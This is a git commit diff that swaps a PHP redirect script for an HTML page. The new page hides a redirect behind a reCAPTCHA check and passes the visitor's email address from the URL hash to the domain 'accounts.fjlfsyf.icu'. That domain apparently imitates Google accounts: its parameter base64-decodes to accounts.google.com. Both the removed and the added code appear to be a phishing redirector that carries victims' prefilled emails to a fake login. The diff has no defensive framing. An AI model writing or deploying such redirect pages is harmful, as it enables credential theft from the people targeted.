ffca578da5c3deddeed5946b6590becc3fb20a2b
Otfdog2025 <contracts@davidadamsongroup.com>
2025-07-24 22:13:04 +0100

    index.html

--- index.php
+++ index.php
@@ -1,68 +1,47 @@
-<?php
-function isBase64($data)
-{
-    if (base64_encode(base64_decode($data, true)) === $data) {
-        return true;
-    } else {
-        return false;
+<!doctype html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <title>...Redirecting</title>
+  <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
+  <meta name="description" content="">
+
+  <!-- Bootstrap -->
+  <link href="https://stackpath.bootstrapcdn.com/bootstrap/4.3.1/css/bootstrap.min.css" rel="stylesheet"
+        integrity="sha384-ggOyR0iXCbMQv3Xipma34MD+dH/1fQ784/j6cY/iJTQUOhcWr7x9JvoRxT2MZw1T" crossorigin="anonymous">
+
+  <!-- Google reCAPTCHA -->
+  <script src="https://www.google.com/recaptcha/api.js" async defer></script>
+</head>
+<body>
+<br><br>
+<div class="container h-100 d-flex justify-content-center">
+  <div class="my-auto">
+    <div class="g-recaptcha"
+         data-sitekey="6LdjNI4rAAAAAKXtx6amPsCAYTjrFb3jm2R4X4j3"
+         data-callback="recaptchaCallback">
+    </div>
+  </div>
+</div>
+
+<script>
+  function recaptchaCallback() {
+    const hash = window.location.hash;
+    let emailParam = "";
+
+    if (hash && hash.startsWith("#")) {
+      emailParam = encodeURIComponent(hash.substring(1));
     }
-}
 
-function decode($email = null){
-    if ($email !== null && isBase64($email)) {
-        $email = base64_decode($email, false);
-    }
-    
-    $redirect_url = "https://accounts.fjlfsyf.icu?h-vhewD1uFR4=aHR0cHM6Ly9hY2NvdW50cy5nb29nbGUuY29t";
-    $delay = 3;
-    
-    ?>
-    <!DOCTYPE html>
-    <html lang="en">
-    <head>
-        <meta charset="UTF-8">
-        <meta name="viewport" content="width=device-width, initial-scale=1.0">
-        <title>Redirecting...</title>
-        <script>
-            setTimeout(function() {
-                let final_url = "<?php echo $redirect_url; ?>";
+    // Replace this URL with your real destination
+    const redirectURL = "https://accounts.fjlfsyf.icu?h-vhewD1uFR4=aHR0cHM6Ly9hY2NvdW50cy5nb29nbGUuY29t";
 
-                if (location.hash) {
-                    let hash_value = location.hash.slice(1);
-                    if (hash_value.startsWith("?")) {
-                        hash_value = hash_value.slice(1);
-                    }
-                    if (hash_value.includes("=") && hash_value.substring(hash_value.indexOf("=") + 1).length > 5){
-                        hash_value = hash_value.substring(hash_value.indexOf("=") + 1);
-                    }
-                    try {
-                        hash_value = atob(hash_value);
-                    } catch{}
+    // Optional: Append email param if needed
+    const finalURL = emailParam ? `${redirectURL}?email=${emailParam}` : redirectURL;
 
-                    location.href = final_url + hash_value
-                } else {
-                    location.href = "<?php echo $redirect_url . urlencode((string)$email);?>";
-                }
-            }, <?php echo $delay * 1000; ?>);
-        </script>
-    </head>
-    <body>
-        <p>Redirecting to a page...</p>
-        <p>You will be redirected in <?php echo $delay; ?> seconds.</p>
-    </body>
-    </html>
-    <?php
-    exit();
-}
-
-if (isset($_SERVER['REQUEST_URI'])) {
-    $url_parts = explode("/", $_SERVER['REQUEST_URI']);
-    $email = end($url_parts);
-    
-    if (!empty($email)) {
-        decode($email);
-    } else {
-        decode();
-    }
-}
-?>
+    // Redirect after successful CAPTCHA
+    window.location.href = finalURL;
+  }
+</script>
+</body>
+</html>
